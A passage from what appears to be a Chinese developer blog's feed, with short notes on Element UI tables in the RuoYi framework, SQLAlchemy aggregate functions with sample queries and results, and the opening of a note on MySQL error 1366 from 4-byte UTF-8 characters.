class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认排序</span></span><br><span class="line">defaultSort: &#123;<span class="attr">prop</span>: <span class="string">'id'</span>, <span class="attr">order</span>: <span class="string">'ascending'</span>&#125;,</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 排序触发事件 */</span></span><br><span class="line">handleSortChange(column, prop, order) &#123;</span><br><span class="line">  <span class="keyword">this</span>.queryParams.orderByColumn = column.prop;</span><br><span class="line">  <span class="keyword">this</span>.queryParams.isAsc = column.order;</span><br><span class="line">  <span class="keyword">this</span>.getList();</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Element </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【开源代码学习--若依】表格中跳转外部链接</title>
      <link href="/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91%E8%A1%A8%E6%A0%BC%E4%B8%AD%E8%B7%B3%E8%BD%AC%E5%A4%96%E9%83%A8%E9%93%BE%E6%8E%A5/"/>
      <url>/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91%E8%A1%A8%E6%A0%BC%E4%B8%AD%E8%B7%B3%E8%BD%AC%E5%A4%96%E9%83%A8%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>现在的需求：表格中需要加入跳转外部链接，链接是后端传入。</p><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><p><strong>参考</strong>：<a href="https://blog.csdn.net/caimaomaocai/article/details/81334641" target="_blank" rel="noopener">在elementui中的table加入可跳转的链接</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-table-column label=&quot;VirusTotal链接&quot; align=&quot;center&quot;&gt;</span><br><span class="line">    &lt;template slot-scope=&quot;scope&quot;&gt;</span><br><span class="line">&lt;a :href=&quot;scope.row.permalink&quot;</span><br><span class="line">   target=&quot;_blank&quot;</span><br><span class="line">   class=&quot;buttonText&quot;</span><br><span class="line">   style=&quot;color: dodgerblue&quot;&gt;跳 转&lt;/a&gt;</span><br><span class="line">    &lt;/template&gt;</span><br><span class="line">&lt;/el-table-column&gt;</span><br></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ol><li><code>scope.row.permalink</code>：表示表格当前行的<code>permalink</code>属性或参数</li><li><code>style=&quot;color: dodgerblue&quot;</code>：设置字体颜色，<a href="http://xh.5156edu.com/page/z1015m9220j18754.html" target="_blank" rel="noopener">颜色表链接</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Element </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【开源代码学习--若依】表格设置列宽</title>
      <link href="/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91%E8%A1%A8%E6%A0%BC%E8%AE%BE%E7%BD%AE%E5%88%97%E5%AE%BD/"/>
      <url>/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91%E8%A1%A8%E6%A0%BC%E8%AE%BE%E7%BD%AE%E5%88%97%E5%AE%BD/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p><a href="https://element.eleme.cn/#/zh-CN/component/table" target="_blank" rel="noopener">官方文档——表格</a></p><p>表格中每列的文字长度不同，有些差距较大，所以需要修改表格的某一列宽度。</p><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><h2 id="21宽度自适应效果不好"><a class="markdownIt-Anchor" href="#21宽度自适应效果不好"></a> 2.1宽度自适应（效果不好）</h2><p><a href="https://cloud.tencent.com/developer/article/1821511" target="_blank" rel="noopener">ElementUI 实现el-table 列宽自适应</a></p><h2 id="22-设置width属性"><a class="markdownIt-Anchor" href="#22-设置width属性"></a> 2.2 设置width属性</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-table-column label=&quot;危害得分&quot; align=&quot;center&quot; prop=&quot;hazardScore&quot; width=&quot;140px&quot;/&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Element </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【开源代码学习--若依】表格分页问题</title>
      <link href="/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91%E8%A1%A8%E6%A0%BC%E5%88%86%E9%A1%B5%E9%97%AE%E9%A2%98/"/>
      <url>/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91%E8%A1%A8%E6%A0%BC%E5%88%86%E9%A1%B5%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题引入"><a class="markdownIt-Anchor" href="#1-问题引入"></a> 1 问题引入</h1><p><a href="https://cn.vuejs.org/" target="_blank" rel="noopener">Vue官方文档</a></p><p>表格实现了分页，但是点击页码后会将所有数据显示或不刷新页面，观察后台，并没有调用操作。</p><p><strong>原因</strong>：回调函数出了问题，没有正确传参。</p><h1 id="2-分页实现"><a class="markdownIt-Anchor" href="#2-分页实现"></a> 2 分页实现</h1><p><strong>参考</strong>：<a href="https://blog.csdn.net/BADAO_LIUMANG_QIZHI/article/details/108017635" target="_blank" rel="noopener">若依管理系统源码分析-分页的实现以及post请求时的分页</a></p><h2 id="21-前端调用"><a class="markdownIt-Anchor" href="#21-前端调用"></a> 2.1 前端调用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 一般在查询参数中定义分页变量</span><br><span class="line">queryParams: &#123;</span><br><span class="line">  pageNum: 1,</span><br><span class="line">  pageSize: 10</span><br><span class="line">&#125;,</span><br><span class="line"> </span><br><span class="line">// 页面添加分页组件，传入分页变量</span><br><span class="line">&lt;pagination</span><br><span class="line">  v-show=&quot;total&gt;0&quot;</span><br><span class="line">  :total=&quot;total&quot;</span><br><span class="line">  :page.sync=&quot;queryParams.pageNum&quot;</span><br><span class="line">  :limit.sync=&quot;queryParams.pageSize&quot;</span><br><span class="line">  @pagination=&quot;getList&quot;</span><br><span class="line">/&gt;</span><br><span class="line"> </span><br><span class="line">// 调用后台方法，传入参数 获取结果</span><br><span class="line">listUser(this.queryParams).then(response =&gt; &#123;</span><br><span class="line">    this.userList = response.rows;</span><br><span class="line">    this.total = response.total;</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="22-后台逻辑实现"><a class="markdownIt-Anchor" href="#22-后台逻辑实现"></a> 2.2 后台逻辑实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"/list"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> TableDataInfo <span class="title">list</span><span class="params">(User user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    startPage();  <span class="comment">// 此方法配合前端完成自动分页</span></span><br><span class="line">    List&lt;User&gt; list = userService.selectUserList(user);</span><br><span class="line">    <span class="keyword">return</span> getDataTable(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-解决"><a class="markdownIt-Anchor" href="#3-解决"></a> 3 解决</h1><p>回调函数进行参数传递：<code>@pagination=&quot;handleDynamic(dynamicRow)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-table v-loading=&quot;dynamicLoading&quot; :data=&quot;dynamicList&quot; @selection-change=&quot;handleSelectionChange&quot; v-fit-columns&gt;</span><br><span class="line">    &lt;el-table-column label=&quot;行为类别&quot; align=&quot;center&quot; prop=&quot;category&quot; width=&quot;140px&quot;/&gt;</span><br><span class="line">    &lt;el-table-column label=&quot;危害等级&quot; align=&quot;center&quot; prop=&quot;hazardLevel&quot; width=&quot;140px&quot;/&gt;</span><br><span class="line">    &lt;el-table-column label=&quot;危害得分&quot; align=&quot;center&quot; prop=&quot;hazardScore&quot; width=&quot;140px&quot;/&gt;</span><br><span class="line">    &lt;el-table-column label=&quot;类目行为代表&quot; align=&quot;center&quot; prop=&quot;represent&quot; /&gt;</span><br><span class="line">&lt;/el-table&gt;</span><br><span class="line">&lt;pagination</span><br><span class="line">            v-show=&quot;dynamicTotal&gt;0&quot;</span><br><span class="line">            :total=&quot;dynamicTotal&quot;</span><br><span class="line">            :page.sync=&quot;queryDynamicParams.pageNum&quot;</span><br><span class="line">            :limit.sync=&quot;queryDynamicParams.pageSize&quot;</span><br><span class="line">            @pagination=&quot;handleDynamic(dynamicRow)&quot;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><p>其中：<code>v-loading</code> 作用为加载动画。</p><h1 id="4-其他问题未解决"><a class="markdownIt-Anchor" href="#4-其他问题未解决"></a> 4 其他问题(未解决)</h1><p>正常情况下，表格页面展示会默认从第一页开始。但是实践过程中会从上次表格页数展示，即使是不同的表格。</p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://element.eleme.cn/#/zh-CN/component/table" target="_blank" rel="noopener">官方文档——表格</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Element </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【开源代码学习--若依】Element显示图片</title>
      <link href="/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91Element%E6%98%BE%E7%A4%BA%E5%9B%BE%E7%89%87/"/>
      <url>/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91Element%E6%98%BE%E7%A4%BA%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引用项目内部的图片"><a class="markdownIt-Anchor" href="#1-引用项目内部的图片"></a> 1 引用项目内部的图片</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-image  :src=&quot;require(&apos;@/assets/graphviz_images/&apos;+this.img_path)&quot; :fit=&quot;cover&quot;&gt;&lt;/el-image&gt;</span><br></pre></td></tr></table></figure><h1 id="2-参考"><a class="markdownIt-Anchor" href="#2-参考"></a> 2 参考</h1><ul><li><a href="https://element.eleme.cn/#/zh-CN/component/image" target="_blank" rel="noopener">官方文档——Image 图片</a></li><li><a href="https://blog.csdn.net/yssa1125001/article/details/106203695" target="_blank" rel="noopener">element ui 或者 element-admin 模板 img 标签 图片不能正常显示或者资源不能正常加载问题</a></li><li><a href="https://blog.csdn.net/qq_27702739/article/details/121213503" target="_blank" rel="noopener">element-ui Image组件中的隐藏功能el-image-viewer组件的使用</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Element </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【开源代码学习--若依】Element中的Icon图标</title>
      <link href="/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91Element%E4%B8%AD%E7%9A%84Icon%E5%9B%BE%E6%A0%87/"/>
      <url>/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91Element%E4%B8%AD%E7%9A%84Icon%E5%9B%BE%E6%A0%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-element简介"><a class="markdownIt-Anchor" href="#1-element简介"></a> 1 Element简介</h1><p>Element，一套为开发者、设计师和产品经理准备的基于 Vue 2.0 的桌面端组件库。</p><p><a href="https://element.eleme.cn/#/zh-CN" target="_blank" rel="noopener">官方文档</a></p><h1 id="2-icon-图标"><a class="markdownIt-Anchor" href="#2-icon-图标"></a> 2 Icon 图标</h1><p>Icon 图标提供了一套常用的图标集合。</p><p>直接通过设置类名为 el-icon-iconName 来使用即可。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;i class=&quot;el-icon-edit&quot;&gt;&lt;/i&gt;</span><br><span class="line">&lt;i class=&quot;el-icon-share&quot;&gt;&lt;/i&gt;</span><br><span class="line">&lt;i class=&quot;el-icon-delete&quot;&gt;&lt;/i&gt;</span><br><span class="line">&lt;el-button type=&quot;primary&quot; icon=&quot;el-icon-search&quot;&gt;搜索&lt;/el-button&gt;</span><br></pre></td></tr></table></figure><p><a href="https://element.eleme.cn/#/zh-CN/component/icon" target="_blank" rel="noopener">官方文档——Icon 图标</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Element </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-Mysql-sqlalchemy中的聚合函数</title>
      <link href="/2022/03/26/Python-Mysql-sqlalchemy%E4%B8%AD%E7%9A%84%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0/"/>
      <url>/2022/03/26/Python-Mysql-sqlalchemy%E4%B8%AD%E7%9A%84%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p><strong>参考</strong>：<a href="https://www.yiibai.com/sql/sql-aggregate-functions.html" target="_blank" rel="noopener">SQL聚合函数</a></p><p>SQL聚合函数，包括：<code>AVG()</code>，<code>COUNT()</code>，<code>MIN()</code>，<code>MAX()</code>和<code>SUM()</code>。</p><p>SQL聚合函数计算一组值并返回单个值。 例如，平均函数(AVG)采用值列表并返回平均值。</p><h1 id="2-实验"><a class="markdownIt-Anchor" href="#2-实验"></a> 2 实验</h1><h2 id="21-构建数据表"><a class="markdownIt-Anchor" href="#21-构建数据表"></a> 2.1 构建数据表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy.ext.declarative <span class="keyword">import</span> declarative_base</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine, Column, Integer, String</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> sessionmaker</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="number">3306</span></span><br><span class="line">USERNAME = <span class="string">'xxx'</span>  <span class="comment"># mysql用户名</span></span><br><span class="line">PASSWORD = <span class="string">'xxx'</span>  <span class="comment"># mysql密码</span></span><br><span class="line">DB = <span class="string">'xxx'</span>  <span class="comment"># 数据库名称</span></span><br><span class="line"><span class="comment"># f代表可以使用&#123;&#125;引用变量</span></span><br><span class="line">DB_URI = <span class="string">f'mysql+pymysql://<span class="subst">&#123;USERNAME&#125;</span>:<span class="subst">&#123;PASSWORD&#125;</span>@<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/<span class="subst">&#123;DB&#125;</span>'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建引擎</span></span><br><span class="line">engine = create_engine(DB_URI)</span><br><span class="line"><span class="comment"># 创建SQLORM基类，注意这里要加参数，参数为上一步创建的引擎</span></span><br><span class="line">Base = declarative_base(engine)</span><br><span class="line"><span class="comment"># 构建session对象</span></span><br><span class="line">session = sessionmaker(engine)()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建实体表Person</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(Base)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'person'</span>  <span class="comment"># 表名</span></span><br><span class="line">    id = Column(Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = Column(String(<span class="number">100</span>))</span><br><span class="line">    age = Column(Integer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将模型映射到数据库中</span></span><br><span class="line"><span class="comment"># 即如果数据库中没有student表则创建映射表student</span></span><br><span class="line">Base.metadata.create_all()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增：批量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_batch</span><span class="params">(obj_list)</span>:</span></span><br><span class="line">    session.add_all(obj_list)</span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除TestTable表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_table</span><span class="params">()</span>:</span></span><br><span class="line">    Person.__table__.drop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    obj_list = [Person(name=<span class="string">"dragon"</span>, age=<span class="number">22</span>),</span><br><span class="line">                Person(name=<span class="string">"pig"</span>, age=<span class="number">23</span>),</span><br><span class="line">                Person(name=<span class="string">"SY"</span>, age=<span class="number">19</span>),</span><br><span class="line">                Person(name=<span class="string">"cat"</span>, age=<span class="number">7</span>),</span><br><span class="line">                Person(name=<span class="string">"toy"</span>, age=<span class="number">8</span>),</span><br><span class="line">                Person(name=<span class="string">"sen"</span>, age=<span class="number">23</span>),</span><br><span class="line">                Person(name=<span class="string">"tor"</span>, age=<span class="number">10</span>),</span><br><span class="line">                ]</span><br><span class="line">    insert_batch(obj_list)</span><br><span class="line">    <span class="comment"># del_table()</span></span><br></pre></td></tr></table></figure><p>数据表如下图所示：</p><img src="https://s2.loli.net/2022/03/26/h8yAv2Ts1OfipVX.png" width="800" height="200" alt="图片名称" align="center" id="120"><p><strong>下面的聚合函数，需要导入<code>func</code>：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> func</span><br></pre></td></tr></table></figure><h2 id="22-avg-返回集合中的平均值"><a class="markdownIt-Anchor" href="#22-avg-返回集合中的平均值"></a> 2.2 AVG() - 返回集合中的平均值</h2><p><strong>参考</strong>：<a href="https://blog.51cto.com/u_15127597/3800261" target="_blank" rel="noopener">SQLAlchemy（二)：SQLAlchemy对数据的增删改查操作、属性常用数据类型详解</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age_avg = session.query(func.avg(Person.age)).scalar()  <span class="comment"># 16.0000</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：这里的<code>age</code>虽然是int类型的，但是最后的平均值是“准确”的小数。</p><h2 id="23-count-返回集合中的项目数"><a class="markdownIt-Anchor" href="#23-count-返回集合中的项目数"></a> 2.3 COUNT() - 返回集合中的项目数</h2><p><strong>参考</strong>：<a href="https://www.jianshu.com/p/b03e20cde341" target="_blank" rel="noopener">SQLAlchemy —— query</a></p><p>返回查询结果的对象的数目，下面的例子是找到了<code>toy</code>和<code>tor</code>两个对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u = session.query(Person).filter(Person.name.like(<span class="string">'to%'</span>)).count()  <span class="comment"># 2</span></span><br></pre></td></tr></table></figure><p>需要单独计算某一类对象的数量，可以用 <code>func()</code> 和 <code>group_by()</code> 配合查询：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u = session.query(Person.name, func.count(Person.name)).group_by(Person.name).all()</span><br><span class="line">print(u)  <span class="comment"># [('dragon', 1), ('pig', 1), ('SY', 1), ('cat', 1), ('toy', 1), ('sen', 1), ('tor', 1)]</span></span><br></pre></td></tr></table></figure><p>返回查询得到的的数值，我们使用 <code>scalar()</code> 方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u = session.query(func.count(Person.age)).scalar()  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure><h2 id="24-min-返回集合的最小值"><a class="markdownIt-Anchor" href="#24-min-返回集合的最小值"></a> 2.4 MIN() - 返回集合的最小值</h2><p><strong>参考</strong>：<a href="https://blog.51cto.com/u_15127597/3800261" target="_blank" rel="noopener">SQLAlchemy（二)：SQLAlchemy对数据的增删改查操作、属性常用数据类型详解</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age_min = session.query(func.min(Person.age)).scalar()  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure><h2 id="25-max-返回集合的最大值"><a class="markdownIt-Anchor" href="#25-max-返回集合的最大值"></a> 2.5 MAX() - 返回集合的最大值</h2><p><strong>参考</strong>：<a href="https://blog.51cto.com/u_15127597/3800261" target="_blank" rel="noopener">SQLAlchemy（二)：SQLAlchemy对数据的增删改查操作、属性常用数据类型详解</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age_max = session.query(func.max(Person.age)).scalar()  <span class="comment"># 23</span></span><br></pre></td></tr></table></figure><h2 id="26-sum-返回所有值的总和"><a class="markdownIt-Anchor" href="#26-sum-返回所有值的总和"></a> 2.6 SUM() - 返回所有值的总和</h2><p><strong>参考</strong>：<a href="https://blog.csdn.net/weixin_43303732/article/details/86476069" target="_blank" rel="noopener">sqlalchemy对数据进行求和</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">age_sum = session.query(func.sum(Person.age)).scalar()  <span class="comment"># 112</span></span><br><span class="line">age_sum = session.query(func.sum(Person.age)).filter(Person.name.like(<span class="string">"to%"</span>)).scalar()  <span class="comment"># 18</span></span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL-错误1366：字段编码报错</title>
      <link href="/2022/03/26/MySQL-%E9%94%99%E8%AF%AF1366%EF%BC%9A%E5%AD%97%E6%AE%B5%E7%BC%96%E7%A0%81%E6%8A%A5%E9%94%99/"/>
      <url>/2022/03/26/MySQL-%E9%94%99%E8%AF%AF1366%EF%BC%9A%E5%AD%97%E6%AE%B5%E7%BC%96%E7%A0%81%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>在做毕设时，操作mysql时出现了这样的一个报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlalchemy.exc.DataError: (pymysql.err.DataError) (1366, <span class="string">"Incorrect string value: '\\xF2\\x88\\xBF\\xB6E ...' for column 'property' at row 1"</span>)</span><br></pre></td></tr></table></figure><p><strong>原因</strong>：UTF-8编码有可能是两个、三个、四个字节。Emoji表情或者某些特殊字符是4个字节，而Mysql的utf8编码最多3个字节，所以数据插不进去。</p><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><h2 id="21-问题复现"><a class="markdownIt-Anchor" href="#21-问题复现"></a> 2.1 问题复现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 